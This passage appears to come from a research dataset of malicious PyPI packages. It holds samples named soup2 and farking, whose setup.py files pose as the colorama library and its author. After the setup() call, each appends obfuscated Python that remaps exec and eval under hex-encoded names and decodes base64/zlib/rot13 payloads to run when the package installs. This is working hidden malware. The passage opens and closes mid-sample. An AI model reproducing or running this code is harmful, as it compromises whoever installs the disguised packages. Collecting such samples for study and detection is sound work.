1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                \n\nfrom .webparser_file import *\nfrom requests import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-02-soup2-v1",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='soup2',\n    version='1',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(exec)'],['''qXkJ+-he`FH%D^p^6V~Edu?pxZ3b+{WfdKmp%22|Y^(afLHJ#WEkRKBG9jRwdr^w>czx|KFR|)z*A{|DJV6C6i43tbcr>i}xDC8rtcOS+jCZg5`x-j4t<`xw?v?GEfgC1cy})7@%S30-Kt)|wV!5-$rN+ujg_6$+rj|SMn}!Bwd&(JE3z4X|@U|pUyc;B-$T*#PsQ0mIi8OGG;^~P(g6^EY$JMdL(FyaVd4ph4UPsUNRSUN5s%8l0H%eu@k+C8M3a?EyI?}LaZx?Q`CR>fF#E6aCtXl<Qpp6x8#M7Vv=Ga!g8BlG#ghB2yScK_Pni=4TtAwe(F)r4+scW&j!RnZ?^sTh$U0PnEog>V-)G-q118~r0V;0e82zzsR<*;)~o__H#8WFjVM!(nauc4{pa6}Tje}2!7J}9cQYd4xA$ZZCQR^6FrWG7&NOH;4zk6?%X=~r}Zx&M$hxH<^EC+!XcK`f_q4LdSK*w`XM(#mg6X~$Zg*+ffo%HM$z<U61Z2>K<WD_+OOAMOz{mI4uph@_A$5+P05j86Ps20bqTgy}K`HF-Y}rf{RCjl~Ya4g8<deVjeA8NlZhNM-0<9kqq0ll<u*<sYmZST8L^N<!NhF4|DR+fq0;Kgs1PbR-3F|06oPi1QFBYnUr;pC&@vv2HY11aWW3&MUnq4^YmbzPGV%LU<FI{xV)QD445}aWMU*@P(9-{|6ZJ9R?m{KH1T<g=<}hYHpVo`~*~Xez-=qXdR-^_i6Lifq*8YQ9MqqshixMsVHyS+b$i=v3pwEUb=wZJ~0O5#PnakS5Gp{Q3;gA#u~ovf_=mUugQRsql+~I4ZCmQ2wR~@LK>RvEg&Dar~u}=_@gV!H>qfM;lZx8BMRLL$U%J%jWrH5oaE7XB}sudaK^_1IL{h@3hVYQ)v*#<!mtgzGP+AuN&N)B9Hr;F!6t65?!l0=H{)j{=NtH)?L+miv~Ji|%Qxq(Q$;=U2?hhX_a|46ov@SaiA`xvI;*P<&2!VF{|b7)yQ(jmpy-3$z!uKH&?bB#@Jd4i1+y%&lGNQCE_fnpA`X;7mYf?TwujFRU7s7Sd?Nm0ybF35Izf4gN`S4`<hIyt21#e#-#eKGWy)M|m>iQe_Wi}(vVceV&(MoHa)ms9f{6&SIXBbW^E-=Rmc+53W+S&ljk8d0ct>WrQgg<rnH=Rl+ej3v`N(21b>gA%9i$k{Rg|q_P;7oO&1Cw)xmBCDX#BQjNg>~zOZKDbj$D~xI%~Cl2gfXn`b6~)n5{sivjzS$>65Zwkg4-fag+D`&i(-h|Mk+aJ6fgQ*TGA9=7QX2bUO!AsUWE5yQ4y-7Nw+q6LukZ<kgd+Wmi%19_V(fA!-Qcb#Hg&q4(8J$YNuYy!(Wh6w5}a?U#S0Qab);4QR70o(uFIntrXaOm+Jsrl_=V>=ySW>C-Awx00Xm@Rh7+F>6Q<uDxADaorJOYRX@)Z>V(f^(S|KO2L+BBm?8i<mfw)%Gx1#PvSnP!g{)`nR{g6t+KzWKg`jxQurKR(F9oSCo-T?*@wXFTqd$*1-WbP_8G|s034PT^mp{Y<Anj&ZM6d6N^v?#!8*wi?+@)Wk!uf$I*V6mkc&ZM0rvS&XZ2-7-o|mS6gq!Xk}{mL+12EdB1qe9mcjP$2QV2g-X5G*TIZohH#~Eq^43N@q@v`{a}@z{tWk-rXy4n6)`g{TxjlVux0!j?r^Uq^bwN32Ih+*U)qrf>kS4wDY}RJj<HTui9y}lmR_K4e9q)5+A!OAsQQ&xfm78Y37-i-Dj`D7*Va}$^o{_#;AG8l#?Uu(u1E(;<GFZ{Nh<)K^pt|I`##p0>h6I7`{J+}^YQQ}tZAb?3PV;T??^oS{`?(X1(Q~D=#w>C*$}LWU`LN9f%bM!*;!Oq=+w|%-;S$8?YHoSD8^vdw&>2(n1R?F@A0WFb!s?}QU^h*%5jN2rh9E=V`441>U(}^7w8u?~wRf;;>me-+{XhBm#W_=hDcwhepc|Ek%6)e(GaE;Anwa@zE_7j^DnNeZ?pgPk=o`yqp7QM<<7*CEE0~(p7(+Cd?Y!P;_T}OxJD~uJeeq+YPoJ+;mV`Wv`=@<z1$iBVw&$;|i_-qE@8|M{vx1&Mq1=7mk8peUlxb+zb^<jDG%$<3FcDpjPuCs66h~Ag#TZk3b&_FMU8Y!dzsSxaY+u_haJ9+U)1=eIahlF_|Ko)WXj6vygkF1;E^W7zUGp}ow^?6k0hxFqoZ(_Ww*@D4@lYJ8`>1|LE)jT4K|)ToZhbfES|L>i@Z6fy9f_ERI6?<<@E|i7$;-%{CHJTIVWTmT(J>99-fC){jIq3K9XRQ#<Kq_4HxTIIX*HrGT(g$}bx-K<KF=)S7@0FVSxHsk+L*Jf#e+r%w&vN~RWG9|H4AB8#2EOP%TL`~flQS!vVP7rjPf#1vSdpl?ibB75z&$y=kDH#+nDG4%7{c`>nFBM2EK?(9j0j}^_;8c%u2q|M}e=8sEb)?q6sbWCQ6vsVK9!>Q^kWo@Q<pdbhehLU)t5hAbRQYVrRspAe|mBUP#xRPzAuR$HEQ=0C2z+q|_vSrU4j{vk#7F?^C;)s5FawDnaaHb!X){X3cI-CMr18G2`!j(l{PqtC`EX1d{e5@;t%cUqh+c&qtWYGl_X9XebI>u8S*g?dbFc+-~!b4}-qaue_qFag{I16To47sOsO$Mk@3cfecWO)YQgpp5RlDW44?qcGHe%t~<+W7@zw=R;rj3jD-64kgJ?H;NtDHH|bO1E)67mRli>(Qa=pO6L>%(u9AH$lfn*I!T%KHcqiH4Ir(#Ru^>DKLQ|yG)X{0U4p<VfkA<aeBILP3Uik3s81>aAUW}8hNug7UV77q$r!dws5Va`;5~`J7lN2Q%;9qzWVKdfZxF;NGy^53nvqgP=mdGuY@gp=qq++pya`V_)JU?(AvuYmtswBj+ZdMx@p(*SdvCL|~{`Mdcd{6I%2F6i61U*`llJJ6W{Ktw7os)=Umn1p=-4czc1>aJDW=o)bW04HhYbrVVQmp@50pzk?{sdu`*K`Orb~V;7lzXZaIuZ@dHNdK#gRc^|s!*`oF7a_gt`>AvPtr2N@>pIsi|0!z2LJOGiUQiNihGEts@RESw+^h<o1c)Eb^!q#q(qH1aLMu_ug9XeN)Yh~RYf$bJ7*shy<Il&`eoXUissTk+KgXZr(18bZI%>UCx@OFiv(;};}O-WGcL^5f75)^-QMqTeq(YG3Zd6|Fn=<P0E#l)rvk7BwDCUDSF=M%gYAXO=jH$W)DumtbJ>Ra<BLH|7*9%Imi~Yc@}Aj2J4Vt%5HoTJbVW8WN*F~MSgP=Dui(FaHTfJD7V}yM5VYhMy2^UR|EmqQJYWeVJ7z;ZZ%w@!GxSMJ7yI6S4=J+TmA3j_MQ-D`KYCWbrXVre3x}HJEi0<8q4MS&B28muS$Nv)?2G^h`gb)cAaIlA{#Sd2*!=b0;IG5Zw_>U+#vw8uTOJ`}Z)hTU14T@Ry)lj2GpVH5wy3}{tjLnBn(M^ZdF*MXqbR6=SU~iO>Do?gp9uUkaNjkZQfWKdYmv<s1ZFnXhV<*c5t<<SvybkG^_OB>N;t{ZU@bZXw9M_jqWGvlXg4zWyA;*t?2~BsI7xv!MZ|ZnU{45tKF{s#ztQ-S!K0x()fs)r-bjGHYISao(XKhACb7RlpiRmRq1IZH0t3d@w>;%k7$1_(qGqhDk{QfZe+7?;%*&YBSAl;V83o-idAeJ#5nfV0pxlbL#MA0y=#6CXSG97L|LZbrNvb^#g>rKRPP9s}`Ek;7J~F+1sr-Bo*;dm3&OqbfE1R~B-!^Gi?H$y-H!DwZgZ+eqkuX5-TQMaJ(L=A<C|u5fJWO2M%Y;9MjY)-cwPS7`4YOMX4L~E${^!wfE0s%HoIPLSu=$9}tbSMgxlqZ-idKkX!R*f24^An~wHjD!R2<#zZ#)}i!h$2JFZcShMYHW~9IOB?3s*|1DJS-Um<1D>x17<6N3$P11naVmM44-qUUuL-F$~S)%%kOdW!&j27#}D>Omd^2k0+`6{=k7ECLGXC)bn+X3R+6O3yf;ED1eG%U3XFTNq1cE>sxOu{`*M5EYaNOu%-F^>>BF=Y-8~unC@Ca6J$qhitZX$uqh>bV6Up&)d8&8G~CE*A-BPKzX~d8fr{HJTLUzeVd9Q1S>kNPIUJS1(R*)RP*<B=Ux(hfjGz5stEC}C2IEHXfa5%%=~y3YPB=qctYi9mh?C_=ZO^%yeqi#A7L_`u%43IRBsTPC?-oN1{ul}fN!A3&(RiJrx}7V*xv32{EJEnfa0lQ-(n@+5#fO!#xR%$okJX3e89XZhn7i|CEl}GvWthkj`UZTD-$F47Akr$a1o6FlUF&emXW%&2*u5%soG<bRR1}Qe4%*4-g}ZQle047e+pZ8Ia8NVdI;NG3UL?P1{ogwLZJCM=?ObwA3rw=V8Z)s9nM7}F%A?GD%-wVlMp0<kbnSzr7)h~#R7*UsIC;#u!hNbC`\ufffdMl~OoPbMp`~6{!2iD=>uL$F^h1CDdS*XQ9op6M#%02~v1;Q@MV;Oij!UE-}GDYn_VwWusH^6`I16B)_Klp>QhlvMO^YMW^!96?e7eu(kNEp=Cl7SQ0QYD}W=}vW9X4+hL@cNu#j^eNB%3CeZSzKsgDS#ENS;5-VDL#j9Dh%_2D!9*!}!kg)@T1j){v?3@7~D8QoiiIbM>1e$vfBN}o@CT->%8L18GZn7FPk?BMj1?3bS&<+(>R_4owLrr5E?u_dTk)El!H@)~~u48$!?g$;QFwxgUZ`1%=lch`NQM3`3zq6#e;e^wn(d)RIZyrd1tj%Rx-ISYc&iKrJu0ibkRWXdYM#b8|B!qxbFU7LNf;_i&aHfU-\nMth;=tRNWDX-38~hO8$RcOvw$x(`o)-b^D`qjv;xpEDf2KSCsBU2QQl#n)O#NBOlJhLl2Fi_0<rzGgCQlO+uk=u1>v!)pftfK%5R7gHZYE5n<U*ebuU<8DrOVUTQ60MW%>)Xv7|)!`^BxAsf6RuGg3%SVg^k-eRou1-6Cob>NS-);ZgJ!zdSEV1&O$>%6oW@gYfAF~XeDq$^2m!5{DXUy3;f9dNAvImtH`k;|n^6^~oiQnY&FxY1W8iNfmY7!>^+G9yMyZXJ~GR7*(_DZ`F6ab_cFR9IEHs0=&5ZEkj^9m7SJiaqHUD1#ptW`V5dnvFs&YMw$+@lW)^?=Jn4XH6t(5`EW71ial)KSDXJK6=s`N&u_8A|7hN)d?kA3G9-w8u82z!aCYf(NTh*wp'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                \n\nfrom .src_file import *\nfrom colorama import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-03-farking-v1",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='farking',\n    version='1',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import json)'],['''<8HQNs1Em}q&wWdyFr3h;s9a1jE$C|WUbAi@8+r{HjXUkYgw$&fxI*EnaM#~7_Kwm9y~*va*6(0NjX=LV|Nh&(}S?9Hp%!(EJ9(m-5tu*O}h3KeyaU`w}?>wnYPSBo&gCVs{<$QKPbRBbFB-+ZePar`WL^|oLu4sq;4b%;+Fa?@|Y!ZoJfTPRy4HVr>1Z_;l1XQ2@\u0005Kzi=7Q|xPaG?4=K*@iMRwF0BixoiB}^-D+?Ey!%X?r-jlYsk~N{pXtY?RO4Ly%(8AFC1OYJ7z_Baa%e{mNB{>ghli?<5f^@Ae6Cad9*R<6%3Zh%=2|=mRayE43a8~d>oanqW=d=xZiTlOkmo-eBzZx#o00Pw*KsmlYPoLs&tc#srQhM+?#)4&WK7h?fJ8m7k|PDADU)l>SqcS4h}JsHSbJSIdn?Pg7)+m)GN70<rP+clItR{{TeTp?H~q_^0lJ|l*VeusxdU0bQY`T@Q^ox(;@j@U$fW<ORwGZn~IEfkoMWK%zVFS7|qzZey5)zz_QjgX$UH`{pq%9#{+qh&`io7titSK(#1Ip>l;@Kf-la3hMxnD4B(oKasM;<<!yBgi4MO<p_<-(wN|ywKm(F-QkGFW?;3L$`*%wu*&?V^Mbo;I0a$ude6B501w3NXCSbc`G;OW^bx4HXr>X8yIu2<CIVy4Ej<KMsGF3+LXDq<I*kY~`hWE2UMHmjm9QFu4sP5419&0fZaYZTdmn6*t$8mpU9}Yg@g9d~uxRaUT%#~xGRo&@PYqh}N<Uto}os}e+HC9DyR?86u0lL62lbUHqF~1_yjWh7PdC=LcX5Iso=wWe?&Q8+Kh92+E828GH0g|)#>aKy&8fTpERf(9I50W<4AKv0g9)Jfw5^k~g*!nb~tps15Zn9O0clntq4Hqdyd3Y<EhAaJkDxCPKl4#ESj&#R4wh6qp&tce5P+k+25OLNV^jWDFSNLB9Cl=85Pl1AP1w=pf&`HBOpB<)n9trSnI`ge4$M?&!2t4jHFgu5e=*X=EzpTIbDo`ig(}Uk;v$;m+=mLMyplAwa^0oREv_TFRRf(?&Xe5(_cwXqum9$R5aGK7AUyaFUNeX=4As30u<d3=(rKroKZ4y5vQ62Js2BE$k(%Hb=e{k!JxAT9JM!vq%GGQhq=M)Wj7cHVU0Y6P-87QP(gtkyAh`gZ=j*U5=P=0?m=e-_U+(2`a88U|nw;@+CskN-N-PmI8NP1d0tJM%716<JqlfcvUq-8IovMm3IGW-Gz3bd3=mra^a5GlcgmDB0<U(k8Yt&-JCnNOZ^%t(0Cb#ZRz?3gdV7+aHz4*Vblumr6W#$BNKO65THpy%YXD5kmt*2ALoONju9vta^8L;(Xa`f^LU@1mTkc=A*QG7AQtceTd$n1p*v>|A5;LAiG>;?t2U@@G$XD}*Y8u8-rzH_>-|F>+?WZpsK`82o9qf=~0;{^~inY=0>UHv?Wel0?Zy7#E{I0ehHV*h4ghyyLDBZVGbu?9xy<qL6B4O%J-#A-q`4uzH{U)$$$Pu9y6d8oC|{r%m-H*=lbf;r8S0(0Ta`R-dxrFc%CX<V*ZWy!EXMI?%<BenPhUoCYK(3e_37U6o1@ZTVCHcccv(#z3_A2eUv+4-0~TK`f4*@R8q)^2vX1j+U4^d6lofOUR((G7J`QsjOaQ5Mgk;u7tJEV47-eA5wg=xS~re+*Uqd<b9Qdcz21ZX?BZcwIk~f74An(4F6ZQpf~|m1?YMyr%p1AFVq?2$}&R?`bIIU3xB_(jODI1$UQkoea2LtZL+8z!_=<J8`NF@h~~Z+V-85xKH-{Ru)kXmIXiM53#qv@8}*|a^-zq*+tHu^Y(F_+D=}y5Cv*z7+yY(Xm34>BN~rGb?p`^MhSL86Az(Bz8+_rfPm3KXJ7EXgAuSY)yzAT&LX1IpjlrOm<NTJNC5K91zw!l$;8-D0%nJ}vLN3<aOtR~i8O%}%qVZ0aXjZS^05WO()Z_*}Mwa+xK&PQQ0`%58qrFj^%pj$+Ve=}Tki*<6c;J`gq<&(sIn#P&3iHETKU>{y;h#~7fz}%2^fH!gVcp+o&H-fAVPKrKNdX|+>m`V>GZp~yS>%6P#;dt2I@Ei3-G-$2tj5%kCvjLO@{h1pU_HmKR%a!Xpd|Q~8lDoG*h6m4(lN}b=AGs9{t8MrxOsrl8L?fCr^Imb+iBTs0nY&5{Du=^{JXpT0ELqEMT?|hHM-A8#hNCixN=TK_YEu{6rQZMPTTI_-d;6;{tOrS1Eq`3B